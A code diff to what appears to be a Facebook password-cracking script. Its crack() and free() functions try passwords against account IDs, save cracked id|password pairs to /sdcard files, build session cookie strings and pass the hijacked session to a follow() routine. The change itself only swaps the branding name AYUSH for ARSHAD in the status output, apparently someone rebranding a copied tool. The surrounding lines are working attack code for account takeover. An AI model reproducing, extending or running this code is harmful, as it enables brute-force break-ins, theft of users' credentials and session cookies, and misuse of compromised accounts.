@@ -650,7 +650,7 @@ def crack(idf,pwv):
 
 				cp +=1
 
-				print( f'\r\x1b[1;91m [AYUSH -CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ARSHAD -CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -664,13 +664,13 @@ def crack(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [AYUSH -OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ARSHAD -OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
 				ok.append(wrt)
 
-				open('/sdcard/AYUSH -OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/ARSHAD -OK.txt','a').write('%s\n' % wrt)
 
 				follow(ses,coki)
 
@@ -698,7 +698,7 @@ def free(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ Proces start] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ ARSHAD ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -726,7 +726,7 @@ def free(idf,pwv):
 
 			if "checkpoint" in po.cookies.get_dict().keys():
 
-				rint( f'\r\x1b[1;92m [AYUSH -Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [ARSHAD -Ok] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -740,13 +740,13 @@ def free(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [AYUSH -OK] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ARSHAD -OK] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
 				ok.append(wrt)
 
-				open('/sdcard/AYUSH -OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/ARSHAD -OK.txt','a').write('%s\n' % wrt)
 
 				follow(ses,coki)
 
@@ -2526,7 +2526,7 @@ class Main:
 
 		sys.stdout.write(
 
-			"\r [ARSHAD ]>%s/COUNT>%s -> OK:-%s - CP:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ ARSHAD ]>%s/COUNT>%s -> OK:-%s - CP:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 
 		); sys.stdout.flush()
 
